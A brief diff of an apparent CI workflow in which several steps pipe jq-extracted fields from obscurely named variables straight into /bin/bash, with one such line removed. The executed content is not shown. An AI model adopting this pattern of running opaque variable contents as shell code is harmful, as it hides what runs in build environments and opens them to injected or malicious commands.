@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$kp987" | jq -r .p9 | /bin/bash
           echo $y6 | jq -r .vxvfb7 | /bin/bash
           echo $onhvu2854 | jq -r .khm706 | /bin/bash
-          echo $fwyse0 | jq -r .omyjw2 | /bin/bash
           printf '%s' "$klx1045" | jq -r .hd3264 | /bin/bash
 
       - name: Archive results
